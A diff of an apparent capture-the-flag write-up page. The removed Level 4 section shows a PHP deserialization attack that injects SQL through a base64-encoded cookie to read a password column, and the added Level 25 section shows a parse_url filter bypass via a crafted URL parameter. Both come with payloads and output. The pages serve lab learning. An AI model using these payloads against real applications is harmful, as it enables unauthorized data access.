@@ -76,38 +76,45 @@
         
   <section class="container centered">
   <div class="error">
-   <h1 id="websec-level-4">WEBSEC Level 4</h1><br><br>
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   <h1 id="websec-level-24">WEBSEC Level 25</h1>
 <h3 id="challenge-description">Challenge description</h3>
-<p>Serialization is a pain!</p><br>
+<p>Nobody listen to techno, nor to wrap music.</p>
 <h3 id="initial-analysis">Initial analysis</h3>
-<p><code>$sql->query = 'SELECT username FROM users WHERE id=';  //query
-
-
-if (isset ($_COOKIE['leet_hax0r'])) {
-    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));   //deserialization vuln
-else  $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
-
-class SQL {
-    public $query = '';
-    public $conn;
-    public function __construct() {      //class
-    }</code></p><br>
-<h3 id="tldr">tl;dr</h3>
-<p>STEP 1: <?php class SQL { public $query = `'SELECT sql as username FROM sqlite_master'`; }
-
-$a = new SQL(); echo serialize($a); echo base64_encode(serialize($a)); ?></p>
-<p>=&gt; O:3:&quot;SQL&quot;:1:{s:5:&quot;query&quot;;s:41:&quot;SELECT sql as username FROM sqlite_master&quot;;} =&gt; TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6NDE6IlNFTEVDVCBzcWwgYXMgdXNlcm5hbWUgRlJPTSBzcWxpdGVfbWFzdGVyIjt9</p>
-<p>STEP 2: Assign Cookie value= <code>TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6NDE6IlNFTEVDVCBzcWwgYXMgdXNlcm5hbWUgRlJPTSBzcWxpdGVfbWFzdGVyIjt9</code></p><p> OUTPUT: Username: CREATE TABLE users(id int, username varchar, password varchar)</p>
-<p>STEP 3: <?php class SQL { public $query = `'SELECT password as username FROM sqlite_master'`; }
-
-$a = new SQL(); echo serialize($a); echo base64_encode(serialize($a)); ?></p>
-<p>=&gt; O:3:&quot;SQL&quot;:1:{s:5:&quot;query&quot;;s:38:&quot;SELECT password as username FROM users&quot;;} =&gt; TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIjt9</p>
-<p>STEP 2: Assign Cookie value= <code>TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzg6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIjt9</code></p>
-<p></p><p>OUTPUT: Username: WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}</p><br>
-<h3 id="flag">Flag</h3>
-<p><strong>FLAG</strong>: <code>WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}</code></p>
+<p><code>?php
+                  parse_str(parse_url($_SERVER['REQUEST_URI'])['query'], $query);
+                  foreach ($query as $k => <span class="math">$v) {                       if (stripos($</span>v, 'flag') !== false) die('You are not allowed to get the flag, sorry :/'); }</p>
+<pre>              include $_GET[&#39;page&#39;] . &#39;.txt&#39;;
+              ?&gt;`</code></pre>
+<h3 id="walk-through">Walk through</h3>
+<p>&quot;parse_url returns false when t has ':' in its parameters&quot;</p>
+<p>STEP 1: http://websec.fr/level25/index.php?page=flag OUTPUT: You are not allowed to get the flag, sorry :/</p>
+<p>STEP 2: http://websec.fr/level25/index.php?page=flag&amp;b=:80 OUTPUT: WEBSEC{How_am_I_supposed_to_parse_uri_when_everything_is_so_broooken}</p>
+<h3 id="flag-websechow_am_i_supposed_to_parse_uri_when_everything_is_so_broooken"><strong><em>FLAG:</em></strong> <code>WEBSEC{How_am_I_supposed_to_parse_uri_when_everything_is_so_broooken}</code></h3>
 <p>For further queries, please DM me on Twitter: <a href="https://twitter.com/m0n574">https://twitter.com/m0n574</a>.</p>
-
+   
+   
+   
+   
+   
+   
+   
+   
+   
 
   </div>
 </section>
